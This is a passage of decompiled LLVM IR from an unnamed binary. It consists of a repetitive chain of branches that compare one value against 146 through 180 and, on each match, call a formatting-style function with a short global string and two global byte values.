dec_label_pc_cee8:                                ; preds = %dec_label_pc_cedc
  %v2_cee8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cef4 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cf00 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cf0c = sext i8 %v3_cef4 to i32
  %v6_cf0c = sext i8 %v3_cf00 to i32
  %v8_cf0c = call i32 @function_92f8(i32 %v2_cee8, i32 ptrtoint ([13 x i8]* @global_var_21bac.348 to i32), i32 %v4_cf0c, i32 %v6_cf0c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf10

dec_label_pc_cf10:                                ; preds = %dec_label_pc_cedc, %dec_label_pc_cee8
  %v7_cf14 = icmp eq i32 %v2_aef8, 146
  br i1 %v7_cf14, label %dec_label_pc_cf1c, label %dec_label_pc_cf44

dec_label_pc_cf1c:                                ; preds = %dec_label_pc_cf10
  %v2_cf1c = ptrtoint i32* %stack_var_-36 to i32
  %v3_cf28 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cf34 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cf40 = sext i8 %v3_cf28 to i32
  %v6_cf40 = sext i8 %v3_cf34 to i32
  %v8_cf40 = call i32 @function_92f8(i32 %v2_cf1c, i32 ptrtoint ([13 x i8]* @global_var_21bbc.350 to i32), i32 %v4_cf40, i32 %v6_cf40, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf44

dec_label_pc_cf44:                                ; preds = %dec_label_pc_cf10, %dec_label_pc_cf1c
  %v7_cf48 = icmp eq i32 %v2_aef8, 147
  br i1 %v7_cf48, label %dec_label_pc_cf50, label %dec_label_pc_cf78

dec_label_pc_cf50:                                ; preds = %dec_label_pc_cf44
  %v2_cf50 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cf5c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cf68 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cf74 = sext i8 %v3_cf5c to i32
  %v6_cf74 = sext i8 %v3_cf68 to i32
  %v8_cf74 = call i32 @function_92f8(i32 %v2_cf50, i32 ptrtoint ([13 x i8]* @global_var_21bcc.352 to i32), i32 %v4_cf74, i32 %v6_cf74, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf78

dec_label_pc_cf78:                                ; preds = %dec_label_pc_cf44, %dec_label_pc_cf50
  %v7_cf7c = icmp eq i32 %v2_aef8, 148
  br i1 %v7_cf7c, label %dec_label_pc_cf84, label %dec_label_pc_cfac

dec_label_pc_cf84:                                ; preds = %dec_label_pc_cf78
  %v2_cf84 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cf90 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cf9c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cfa8 = sext i8 %v3_cf90 to i32
  %v6_cfa8 = sext i8 %v3_cf9c to i32
  %v8_cfa8 = call i32 @function_92f8(i32 %v2_cf84, i32 ptrtoint ([13 x i8]* @global_var_21bdc.354 to i32), i32 %v4_cfa8, i32 %v6_cfa8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cfac

dec_label_pc_cfac:                                ; preds = %dec_label_pc_cf78, %dec_label_pc_cf84
  %v7_cfb0 = icmp eq i32 %v2_aef8, 149
  br i1 %v7_cfb0, label %dec_label_pc_cfb8, label %dec_label_pc_cfe0

dec_label_pc_cfb8:                                ; preds = %dec_label_pc_cfac
  %v2_cfb8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cfc4 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_cfd0 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_cfdc = sext i8 %v3_cfc4 to i32
  %v6_cfdc = sext i8 %v3_cfd0 to i32
  %v8_cfdc = call i32 @function_92f8(i32 %v2_cfb8, i32 ptrtoint ([13 x i8]* @global_var_21bec.357 to i32), i32 %v4_cfdc, i32 %v6_cfdc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cfe0

dec_label_pc_cfe0:                                ; preds = %dec_label_pc_cfac, %dec_label_pc_cfb8
  %v7_cfe4 = icmp eq i32 %v2_aef8, 150
  br i1 %v7_cfe4, label %dec_label_pc_cfec, label %dec_label_pc_d014

dec_label_pc_cfec:                                ; preds = %dec_label_pc_cfe0
  %v2_cfec = ptrtoint i32* %stack_var_-36 to i32
  %v3_cff8 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d004 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d010 = sext i8 %v3_cff8 to i32
  %v6_d010 = sext i8 %v3_d004 to i32
  %v8_d010 = call i32 @function_92f8(i32 %v2_cfec, i32 ptrtoint ([13 x i8]* @global_var_21bfc.359 to i32), i32 %v4_d010, i32 %v6_d010, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d014

dec_label_pc_d014:                                ; preds = %dec_label_pc_cfe0, %dec_label_pc_cfec
  %v7_d018 = icmp eq i32 %v2_aef8, 151
  br i1 %v7_d018, label %dec_label_pc_d020, label %dec_label_pc_d048

dec_label_pc_d020:                                ; preds = %dec_label_pc_d014
  %v2_d020 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d02c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d038 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d044 = sext i8 %v3_d02c to i32
  %v6_d044 = sext i8 %v3_d038 to i32
  %v8_d044 = call i32 @function_92f8(i32 %v2_d020, i32 ptrtoint ([13 x i8]* @global_var_21c0c.361 to i32), i32 %v4_d044, i32 %v6_d044, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d048

dec_label_pc_d048:                                ; preds = %dec_label_pc_d014, %dec_label_pc_d020
  %v7_d04c = icmp eq i32 %v2_aef8, 152
  br i1 %v7_d04c, label %dec_label_pc_d054, label %dec_label_pc_d07c

dec_label_pc_d054:                                ; preds = %dec_label_pc_d048
  %v2_d054 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d060 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d06c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d078 = sext i8 %v3_d060 to i32
  %v6_d078 = sext i8 %v3_d06c to i32
  %v8_d078 = call i32 @function_92f8(i32 %v2_d054, i32 ptrtoint ([13 x i8]* @global_var_21c1c.363 to i32), i32 %v4_d078, i32 %v6_d078, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d07c

dec_label_pc_d07c:                                ; preds = %dec_label_pc_d048, %dec_label_pc_d054
  %v7_d080 = icmp eq i32 %v2_aef8, 153
  br i1 %v7_d080, label %dec_label_pc_d088, label %dec_label_pc_d0b0

dec_label_pc_d088:                                ; preds = %dec_label_pc_d07c
  %v2_d088 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d094 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d0a0 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d0ac = sext i8 %v3_d094 to i32
  %v6_d0ac = sext i8 %v3_d0a0 to i32
  %v8_d0ac = call i32 @function_92f8(i32 %v2_d088, i32 ptrtoint ([13 x i8]* @global_var_21c2c.365 to i32), i32 %v4_d0ac, i32 %v6_d0ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0b0

dec_label_pc_d0b0:                                ; preds = %dec_label_pc_d07c, %dec_label_pc_d088
  %v7_d0b4 = icmp eq i32 %v2_aef8, 154
  br i1 %v7_d0b4, label %dec_label_pc_d0bc, label %dec_label_pc_d0e4

dec_label_pc_d0bc:                                ; preds = %dec_label_pc_d0b0
  %v2_d0bc = ptrtoint i32* %stack_var_-36 to i32
  %v3_d0c8 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d0d4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d0e0 = sext i8 %v3_d0c8 to i32
  %v6_d0e0 = sext i8 %v3_d0d4 to i32
  %v8_d0e0 = call i32 @function_92f8(i32 %v2_d0bc, i32 ptrtoint ([13 x i8]* @global_var_21c3c.367 to i32), i32 %v4_d0e0, i32 %v6_d0e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0e4

dec_label_pc_d0e4:                                ; preds = %dec_label_pc_d0b0, %dec_label_pc_d0bc
  %v7_d0e8 = icmp eq i32 %v2_aef8, 155
  br i1 %v7_d0e8, label %dec_label_pc_d0f0, label %dec_label_pc_d118

dec_label_pc_d0f0:                                ; preds = %dec_label_pc_d0e4
  %v2_d0f0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d0fc = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d108 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d114 = sext i8 %v3_d0fc to i32
  %v6_d114 = sext i8 %v3_d108 to i32
  %v8_d114 = call i32 @function_92f8(i32 %v2_d0f0, i32 ptrtoint ([13 x i8]* @global_var_21c4c.369 to i32), i32 %v4_d114, i32 %v6_d114, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d118

dec_label_pc_d118:                                ; preds = %dec_label_pc_d0e4, %dec_label_pc_d0f0
  %v7_d11c = icmp eq i32 %v2_aef8, 156
  br i1 %v7_d11c, label %dec_label_pc_d124, label %dec_label_pc_d14c

dec_label_pc_d124:                                ; preds = %dec_label_pc_d118
  %v2_d124 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d130 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d13c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d148 = sext i8 %v3_d130 to i32
  %v6_d148 = sext i8 %v3_d13c to i32
  %v8_d148 = call i32 @function_92f8(i32 %v2_d124, i32 ptrtoint ([13 x i8]* @global_var_21c5c.371 to i32), i32 %v4_d148, i32 %v6_d148, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d14c

dec_label_pc_d14c:                                ; preds = %dec_label_pc_d118, %dec_label_pc_d124
  %v7_d150 = icmp eq i32 %v2_aef8, 157
  br i1 %v7_d150, label %dec_label_pc_d158, label %dec_label_pc_d180

dec_label_pc_d158:                                ; preds = %dec_label_pc_d14c
  %v2_d158 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d164 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d170 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d17c = sext i8 %v3_d164 to i32
  %v6_d17c = sext i8 %v3_d170 to i32
  %v8_d17c = call i32 @function_92f8(i32 %v2_d158, i32 ptrtoint ([13 x i8]* @global_var_21c6c.373 to i32), i32 %v4_d17c, i32 %v6_d17c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d180

dec_label_pc_d180:                                ; preds = %dec_label_pc_d14c, %dec_label_pc_d158
  %v7_d184 = icmp eq i32 %v2_aef8, 158
  br i1 %v7_d184, label %dec_label_pc_d18c, label %dec_label_pc_d1b4

dec_label_pc_d18c:                                ; preds = %dec_label_pc_d180
  %v2_d18c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d198 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d1a4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d1b0 = sext i8 %v3_d198 to i32
  %v6_d1b0 = sext i8 %v3_d1a4 to i32
  %v8_d1b0 = call i32 @function_92f8(i32 %v2_d18c, i32 ptrtoint ([13 x i8]* @global_var_21c7c.375 to i32), i32 %v4_d1b0, i32 %v6_d1b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1b4

dec_label_pc_d1b4:                                ; preds = %dec_label_pc_d180, %dec_label_pc_d18c
  %v7_d1b8 = icmp eq i32 %v2_aef8, 159
  br i1 %v7_d1b8, label %dec_label_pc_d1c0, label %dec_label_pc_d1e8

dec_label_pc_d1c0:                                ; preds = %dec_label_pc_d1b4
  %v2_d1c0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d1cc = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d1d8 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d1e4 = sext i8 %v3_d1cc to i32
  %v6_d1e4 = sext i8 %v3_d1d8 to i32
  %v8_d1e4 = call i32 @function_92f8(i32 %v2_d1c0, i32 ptrtoint ([13 x i8]* @global_var_21c8c.377 to i32), i32 %v4_d1e4, i32 %v6_d1e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1e8

dec_label_pc_d1e8:                                ; preds = %dec_label_pc_d1b4, %dec_label_pc_d1c0
  %v7_d1ec = icmp eq i32 %v2_aef8, 160
  br i1 %v7_d1ec, label %dec_label_pc_d1f4, label %dec_label_pc_d21c

dec_label_pc_d1f4:                                ; preds = %dec_label_pc_d1e8
  %v2_d1f4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d200 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d20c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d218 = sext i8 %v3_d200 to i32
  %v6_d218 = sext i8 %v3_d20c to i32
  %v8_d218 = call i32 @function_92f8(i32 %v2_d1f4, i32 ptrtoint ([13 x i8]* @global_var_21c9c.379 to i32), i32 %v4_d218, i32 %v6_d218, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d21c

dec_label_pc_d21c:                                ; preds = %dec_label_pc_d1e8, %dec_label_pc_d1f4
  %v7_d220 = icmp eq i32 %v2_aef8, 161
  br i1 %v7_d220, label %dec_label_pc_d228, label %dec_label_pc_d250

dec_label_pc_d228:                                ; preds = %dec_label_pc_d21c
  %v2_d228 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d234 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d240 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d24c = sext i8 %v3_d234 to i32
  %v6_d24c = sext i8 %v3_d240 to i32
  %v8_d24c = call i32 @function_92f8(i32 %v2_d228, i32 ptrtoint ([12 x i8]* @global_var_21cac.381 to i32), i32 %v4_d24c, i32 %v6_d24c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d250

dec_label_pc_d250:                                ; preds = %dec_label_pc_d21c, %dec_label_pc_d228
  %v7_d254 = icmp eq i32 %v2_aef8, 162
  br i1 %v7_d254, label %dec_label_pc_d25c, label %dec_label_pc_d284

dec_label_pc_d25c:                                ; preds = %dec_label_pc_d250
  %v2_d25c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d268 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d274 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d280 = sext i8 %v3_d268 to i32
  %v6_d280 = sext i8 %v3_d274 to i32
  %v8_d280 = call i32 @function_92f8(i32 %v2_d25c, i32 ptrtoint ([13 x i8]* @global_var_21cb8.383 to i32), i32 %v4_d280, i32 %v6_d280, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d284

dec_label_pc_d284:                                ; preds = %dec_label_pc_d250, %dec_label_pc_d25c
  %v7_d288 = icmp eq i32 %v2_aef8, 163
  br i1 %v7_d288, label %dec_label_pc_d290, label %dec_label_pc_d2b8

dec_label_pc_d290:                                ; preds = %dec_label_pc_d284
  %v2_d290 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d29c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d2a8 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d2b4 = sext i8 %v3_d29c to i32
  %v6_d2b4 = sext i8 %v3_d2a8 to i32
  %v8_d2b4 = call i32 @function_92f8(i32 %v2_d290, i32 ptrtoint ([13 x i8]* @global_var_21cc8.385 to i32), i32 %v4_d2b4, i32 %v6_d2b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2b8

dec_label_pc_d2b8:                                ; preds = %dec_label_pc_d284, %dec_label_pc_d290
  %v7_d2bc = icmp eq i32 %v2_aef8, 164
  br i1 %v7_d2bc, label %dec_label_pc_d2c4, label %dec_label_pc_d2ec

dec_label_pc_d2c4:                                ; preds = %dec_label_pc_d2b8
  %v2_d2c4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d2d0 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d2dc = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d2e8 = sext i8 %v3_d2d0 to i32
  %v6_d2e8 = sext i8 %v3_d2dc to i32
  %v8_d2e8 = call i32 @function_92f8(i32 %v2_d2c4, i32 ptrtoint ([13 x i8]* @global_var_21cd8.387 to i32), i32 %v4_d2e8, i32 %v6_d2e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2ec

dec_label_pc_d2ec:                                ; preds = %dec_label_pc_d2b8, %dec_label_pc_d2c4
  %v7_d2f0 = icmp eq i32 %v2_aef8, 165
  br i1 %v7_d2f0, label %dec_label_pc_d2f8, label %dec_label_pc_d320

dec_label_pc_d2f8:                                ; preds = %dec_label_pc_d2ec
  %v2_d2f8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d304 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d310 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d31c = sext i8 %v3_d304 to i32
  %v6_d31c = sext i8 %v3_d310 to i32
  %v8_d31c = call i32 @function_92f8(i32 %v2_d2f8, i32 ptrtoint ([12 x i8]* @global_var_21ce8.389 to i32), i32 %v4_d31c, i32 %v6_d31c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d320

dec_label_pc_d320:                                ; preds = %dec_label_pc_d2ec, %dec_label_pc_d2f8
  %v7_d324 = icmp eq i32 %v2_aef8, 166
  br i1 %v7_d324, label %dec_label_pc_d32c, label %dec_label_pc_d354

dec_label_pc_d32c:                                ; preds = %dec_label_pc_d320
  %v2_d32c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d338 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d344 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d350 = sext i8 %v3_d338 to i32
  %v6_d350 = sext i8 %v3_d344 to i32
  %v8_d350 = call i32 @function_92f8(i32 %v2_d32c, i32 ptrtoint ([13 x i8]* @global_var_21cf4.391 to i32), i32 %v4_d350, i32 %v6_d350, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d354

dec_label_pc_d354:                                ; preds = %dec_label_pc_d320, %dec_label_pc_d32c
  %v7_d358 = icmp eq i32 %v2_aef8, 167
  br i1 %v7_d358, label %dec_label_pc_d360, label %dec_label_pc_d388

dec_label_pc_d360:                                ; preds = %dec_label_pc_d354
  %v2_d360 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d36c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d378 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d384 = sext i8 %v3_d36c to i32
  %v6_d384 = sext i8 %v3_d378 to i32
  %v8_d384 = call i32 @function_92f8(i32 %v2_d360, i32 ptrtoint ([14 x i8]* @global_var_21d04.393 to i32), i32 %v4_d384, i32 %v6_d384, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d388

dec_label_pc_d388:                                ; preds = %dec_label_pc_d354, %dec_label_pc_d360
  %v7_d38c = icmp eq i32 %v2_aef8, 168
  br i1 %v7_d38c, label %dec_label_pc_d394, label %dec_label_pc_d3bc

dec_label_pc_d394:                                ; preds = %dec_label_pc_d388
  %v2_d394 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d3a0 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d3ac = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d3b8 = sext i8 %v3_d3a0 to i32
  %v6_d3b8 = sext i8 %v3_d3ac to i32
  %v8_d3b8 = call i32 @function_92f8(i32 %v2_d394, i32 ptrtoint ([14 x i8]* @global_var_21d14.395 to i32), i32 %v4_d3b8, i32 %v6_d3b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3bc

dec_label_pc_d3bc:                                ; preds = %dec_label_pc_d388, %dec_label_pc_d394
  %v7_d3c0 = icmp eq i32 %v2_aef8, 169
  br i1 %v7_d3c0, label %dec_label_pc_d3c8, label %dec_label_pc_d3f0

dec_label_pc_d3c8:                                ; preds = %dec_label_pc_d3bc
  %v2_d3c8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d3d4 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d3e0 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d3ec = sext i8 %v3_d3d4 to i32
  %v6_d3ec = sext i8 %v3_d3e0 to i32
  %v8_d3ec = call i32 @function_92f8(i32 %v2_d3c8, i32 ptrtoint ([13 x i8]* @global_var_21d24.397 to i32), i32 %v4_d3ec, i32 %v6_d3ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3f0

dec_label_pc_d3f0:                                ; preds = %dec_label_pc_d3bc, %dec_label_pc_d3c8
  %v7_d3f4 = icmp eq i32 %v2_aef8, 170
  br i1 %v7_d3f4, label %dec_label_pc_d3fc, label %dec_label_pc_d424

dec_label_pc_d3fc:                                ; preds = %dec_label_pc_d3f0
  %v2_d3fc = ptrtoint i32* %stack_var_-36 to i32
  %v3_d408 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d414 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d420 = sext i8 %v3_d408 to i32
  %v6_d420 = sext i8 %v3_d414 to i32
  %v8_d420 = call i32 @function_92f8(i32 %v2_d3fc, i32 ptrtoint ([14 x i8]* @global_var_21d34.399 to i32), i32 %v4_d420, i32 %v6_d420, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d424

dec_label_pc_d424:                                ; preds = %dec_label_pc_d3f0, %dec_label_pc_d3fc
  %v7_d428 = icmp eq i32 %v2_aef8, 171
  br i1 %v7_d428, label %dec_label_pc_d430, label %dec_label_pc_d458

dec_label_pc_d430:                                ; preds = %dec_label_pc_d424
  %v2_d430 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d43c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d448 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d454 = sext i8 %v3_d43c to i32
  %v6_d454 = sext i8 %v3_d448 to i32
  %v8_d454 = call i32 @function_92f8(i32 %v2_d430, i32 ptrtoint ([14 x i8]* @global_var_21d44.401 to i32), i32 %v4_d454, i32 %v6_d454, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d458

dec_label_pc_d458:                                ; preds = %dec_label_pc_d424, %dec_label_pc_d430
  %v7_d45c = icmp eq i32 %v2_aef8, 172
  br i1 %v7_d45c, label %dec_label_pc_d464, label %dec_label_pc_d48c

dec_label_pc_d464:                                ; preds = %dec_label_pc_d458
  %v2_d464 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d470 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d47c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d488 = sext i8 %v3_d470 to i32
  %v6_d488 = sext i8 %v3_d47c to i32
  %v8_d488 = call i32 @function_92f8(i32 %v2_d464, i32 ptrtoint ([13 x i8]* @global_var_21d54.403 to i32), i32 %v4_d488, i32 %v6_d488, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d48c

dec_label_pc_d48c:                                ; preds = %dec_label_pc_d458, %dec_label_pc_d464
  %v7_d490 = icmp eq i32 %v2_aef8, 173
  br i1 %v7_d490, label %dec_label_pc_d498, label %dec_label_pc_d4c0

dec_label_pc_d498:                                ; preds = %dec_label_pc_d48c
  %v2_d498 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d4a4 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d4b0 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d4bc = sext i8 %v3_d4a4 to i32
  %v6_d4bc = sext i8 %v3_d4b0 to i32
  %v8_d4bc = call i32 @function_92f8(i32 %v2_d498, i32 ptrtoint ([14 x i8]* @global_var_21d64.405 to i32), i32 %v4_d4bc, i32 %v6_d4bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d4c0

dec_label_pc_d4c0:                                ; preds = %dec_label_pc_d48c, %dec_label_pc_d498
  %v7_d4c4 = icmp eq i32 %v2_aef8, 174
  br i1 %v7_d4c4, label %dec_label_pc_d4cc, label %dec_label_pc_d4f4

dec_label_pc_d4cc:                                ; preds = %dec_label_pc_d4c0
  %v2_d4cc = ptrtoint i32* %stack_var_-36 to i32
  %v3_d4d8 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d4e4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d4f0 = sext i8 %v3_d4d8 to i32
  %v6_d4f0 = sext i8 %v3_d4e4 to i32
  %v8_d4f0 = call i32 @function_92f8(i32 %v2_d4cc, i32 ptrtoint ([13 x i8]* @global_var_21d74.407 to i32), i32 %v4_d4f0, i32 %v6_d4f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d4f4

dec_label_pc_d4f4:                                ; preds = %dec_label_pc_d4c0, %dec_label_pc_d4cc
  %v7_d4f8 = icmp eq i32 %v2_aef8, 175
  br i1 %v7_d4f8, label %dec_label_pc_d500, label %dec_label_pc_d528

dec_label_pc_d500:                                ; preds = %dec_label_pc_d4f4
  %v2_d500 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d50c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d518 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d524 = sext i8 %v3_d50c to i32
  %v6_d524 = sext i8 %v3_d518 to i32
  %v8_d524 = call i32 @function_92f8(i32 %v2_d500, i32 ptrtoint ([14 x i8]* @global_var_21d84.409 to i32), i32 %v4_d524, i32 %v6_d524, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d528

dec_label_pc_d528:                                ; preds = %dec_label_pc_d4f4, %dec_label_pc_d500
  %v7_d52c = icmp eq i32 %v2_aef8, 176
  br i1 %v7_d52c, label %dec_label_pc_d534, label %dec_label_pc_d55c

dec_label_pc_d534:                                ; preds = %dec_label_pc_d528
  %v2_d534 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d540 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d54c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d558 = sext i8 %v3_d540 to i32
  %v6_d558 = sext i8 %v3_d54c to i32
  %v8_d558 = call i32 @function_92f8(i32 %v2_d534, i32 ptrtoint ([14 x i8]* @global_var_21d94.411 to i32), i32 %v4_d558, i32 %v6_d558, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d55c

dec_label_pc_d55c:                                ; preds = %dec_label_pc_d528, %dec_label_pc_d534
  %v7_d560 = icmp eq i32 %v2_aef8, 177
  br i1 %v7_d560, label %dec_label_pc_d568, label %dec_label_pc_d590

dec_label_pc_d568:                                ; preds = %dec_label_pc_d55c
  %v2_d568 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d574 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d580 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d58c = sext i8 %v3_d574 to i32
  %v6_d58c = sext i8 %v3_d580 to i32
  %v8_d58c = call i32 @function_92f8(i32 %v2_d568, i32 ptrtoint ([14 x i8]* @global_var_21da4.413 to i32), i32 %v4_d58c, i32 %v6_d58c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d590

dec_label_pc_d590:                                ; preds = %dec_label_pc_d55c, %dec_label_pc_d568
  %v7_d594 = icmp eq i32 %v2_aef8, 178
  br i1 %v7_d594, label %dec_label_pc_d59c, label %dec_label_pc_d5c4

dec_label_pc_d59c:                                ; preds = %dec_label_pc_d590
  %v2_d59c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d5a8 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d5b4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d5c0 = sext i8 %v3_d5a8 to i32
  %v6_d5c0 = sext i8 %v3_d5b4 to i32
  %v8_d5c0 = call i32 @function_92f8(i32 %v2_d59c, i32 ptrtoint ([14 x i8]* @global_var_21db4.415 to i32), i32 %v4_d5c0, i32 %v6_d5c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d5c4

dec_label_pc_d5c4:                                ; preds = %dec_label_pc_d590, %dec_label_pc_d59c
  %v7_d5c8 = icmp eq i32 %v2_aef8, 179
  br i1 %v7_d5c8, label %dec_label_pc_d5d0, label %dec_label_pc_d5f8

dec_label_pc_d5d0:                                ; preds = %dec_label_pc_d5c4
  %v2_d5d0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d5dc = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d5e8 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d5f4 = sext i8 %v3_d5dc to i32
  %v6_d5f4 = sext i8 %v3_d5e8 to i32
  %v8_d5f4 = call i32 @function_92f8(i32 %v2_d5d0, i32 ptrtoint ([14 x i8]* @global_var_21d04.393 to i32), i32 %v4_d5f4, i32 %v6_d5f4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d5f8

dec_label_pc_d5f8:                                ; preds = %dec_label_pc_d5c4, %dec_label_pc_d5d0
  %v7_d5fc = icmp eq i32 %v2_aef8, 180
  br i1 %v7_d5fc, label %dec_label_pc_d604, label %dec_label_pc_d62c

dec_label_pc_d604:                                ; preds = %dec_label_pc_d5f8
  %v2_d604 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d610 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_d61c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_d628 = sext i8 %v3_d610 to i32
  %v6_d628 = sext i8 %v3_d61c to i32
